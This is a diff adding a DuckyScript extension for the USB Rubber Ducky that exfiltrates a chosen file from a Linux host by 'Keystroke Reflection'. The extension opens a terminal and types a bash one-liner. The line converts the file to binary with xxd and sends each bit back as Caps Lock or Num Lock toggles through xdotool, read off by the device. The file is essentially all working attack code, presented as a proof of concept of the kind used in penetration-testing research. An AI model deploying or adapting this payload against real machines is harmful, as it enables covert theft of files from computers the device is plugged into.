@@ -1,0 +1,94 @@
+EXTENSION LINUX_HID_EXFIL
+    REM VERSION 1.1
+    REM AUTHOR: Korben
+
+    REM REQUIRES EXTENSION EXFIL_AUTO_EOF_DETECT
+
+    REM_BLOCK DOCUMENTATION
+        Helpers for Linux Keystroke Reflection data exfiltration
+        This payload is a proof of concept for USB HID only Data Exfiltration
+
+        TARGET:
+            Linux host that supports opening terminal via CTRL ALT t, and xdotool
+
+        USAGE:
+            REQUIRES EXFIL_AUTO_EOF_DETECT EXTENSION
+            Prepare data to exfil (in filename defined by TARGET_FILE below)
+            with a terminal window already open - call RUN_LINUX_EXFIL()
+
+        DEPLOYMENT:
+            Plug Ducky into host, wait for the LED to turn (and stay) solid Green.
+    END_REM
+
+    REM CONFIGURATION:
+    REM File on host machine to exfil using Keystroke Reflection attack
+    DEFINE #TARGET_FILE filename.txt
+
+    DEFINE #SAVE_AND_RESTORE_LOCKS TRUE
+    DEFINE #ENABLE_EXFIL_LEDS TRUE
+    DEFINE #CLOSE_TERMINAL_AFTER_EXFIL TRUE
+
+    REM if TRUE will open terminal, prepare data in #TARGET_FILE, and RUN_LINUX_EXFIL()
+    DEFINE #RUN_SIMPLE_USAGE_DEMO FALSE
+
+    FUNCTION RUN_LINUX_EXFIL()
+        IF_DEFINED_TRUE #ENABLE_EXFIL_LEDS
+            LED_OFF
+            $_EXFIL_LEDS_ENABLED = TRUE
+        END_IF_DEFINED
+
+        IF_DEFINED_TRUE #SAVE_AND_RESTORE_LOCKS
+            SAVE_HOST_KEYBOARD_LOCK_STATE
+        END_IF_DEFINED
+
+        $_EXFIL_MODE_ENABLED = TRUE
+        STRING_BASH
+            c="xdotool key --delay 4";
+            bs=$(xxd -b 
+            #TARGET_FILE
+            |cut -d" " -f2-7);
+            for((i=0;i<${#bs};i++));do 
+                b="${bs:$i:1}";
+                if [[ "$b" == "0" ]];then 
+                    c+=" Caps_Lock";
+                fi;
+                if [[ "$b" == "1" ]];then 
+                    c+=" Num_Lock";
+                fi;
+            done;
+            $c;
+        END_STRING
+
+        IF_DEFINED_TRUE #CLOSE_TERMINAL_AFTER_EXFIL
+            STRING exit;
+        END_IF_DEFINED
+
+        ENTER
+
+        REM Requires adding EXFIL_AUTO_EOF_DETECT EXTENSION above this one
+        WAIT_FOR_EOF()
+
+        $_EXFIL_MODE_ENABLED = FALSE
+
+        IF_DEFINED_TRUE #ENABLE_EXFIL_LEDS
+            $_EXFIL_LEDS_ENABLED = FALSE
+        END_IF_DEFINED
+
+        IF_DEFINED_TRUE #SAVE_AND_RESTORE_LOCKS
+            RESTORE_HOST_KEYBOARD_LOCK_STATE
+        END_IF_DEFINED
+    END_FUNCTION
+
+    IF_DEFINED_TRUE #RUN_SIMPLE_USAGE_DEMO
+        REM DO NOT MODIFY THIS DEMO - copy and move outside extension if using as template.
+        REM DEMO Boot Delay
+        DELAY 3000
+        REM Open Terminal
+        CTRL ALT t
+        DELAY 500
+        REM Perpare some data in TARGET_FILE
+        STRINGLN uname -a>#TARGET_FILE
+        REM Exfil data to USB Rubber Ducky using Keystroke Reflection
+        RUN_LINUX_EXFIL()
+    END_IF_DEFINED
+END_EXTENSION
